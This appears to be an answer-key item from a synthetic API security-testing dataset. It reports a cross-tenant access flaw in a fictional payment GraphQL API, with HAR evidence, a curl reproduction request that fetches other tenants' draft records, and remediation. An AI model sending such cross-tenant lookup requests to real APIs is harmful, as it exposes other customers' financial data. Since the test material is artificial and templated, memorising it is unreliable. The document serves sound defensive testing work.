# Expected Response

## System
- **Domain:** FinTech / Payment Processing
- **System:** PayBridge Transaction API
- **Example ID:** GQL-0220

## Priority Findings

### Finding 1: FinTech — Draft Resource Access via bulkResourceLookup Exposes Cross-Tenant Transaction Data (Pattern 10.5)
**Severity:** High
**Category:** Single-User / Draft / Non-Published Resource Access

**Summary:**
Per §4.0 (RISK-GQL-220): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 10.5 — draft/non-published resource access): `bulkResourceLookup` returns draft transaction records belonging to other tenants when cross-tenant IDs are supplied without JWT validation. An attacker from `tenant-a29c` queried `bulkResourceLookup(ids: ["R-2220", "R-1220", "R-3220"])` and received draft transaction data belonging to `tenant-c25b`, including `CONFIDENTIAL-a29cc25b`. In FinTech / Payment Processing, unauthorized access to draft payment records, settlement data, and transaction queues enables financial fraud.

**Evidence from HAR:**
- Request: `POST https://api.paybridge-transactio.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-a29c`
- Query: `bulkResourceLookup(ids: ["R-2220", "R-1220", "R-3220"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-c25b"`, `ownerId: "other-user-a29cc25b"`, `sensitiveField: "CONFIDENTIAL-a29cc25b"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-a29cc25b`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-220 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 10.5 | Draft resource returned to unauthorized tenant via bulk lookup |
| HAR query | ids: ["R-2220"...] | Cross-tenant draft transaction lookup |
| HAR response | tenantId | tenant-c25b returned to tenant-a29c |
| HAR response | sensitiveField | CONFIDENTIAL-a29cc25b |
| HAR header | x-request-id | req-a29cc25b |

## Steps to Reproduce

### Step 1 — bulkResourceLookup draft resource access FinTech (HAR)
```bash
curl -s -X POST https://api.paybridge-transactio.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-a29c" \
  -d '{"query": "query { bulkResourceLookup(ids: [\"R-2220\", \"R-1220\", \"R-3220\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `tenant-c25b` draft transaction data including `CONFIDENTIAL-a29cc25b`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id = ANY($ids) AND tenant_id = $jwt.tenantId AND status != 'draft'`.
2. Draft records must only be accessible by their owning tenant.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
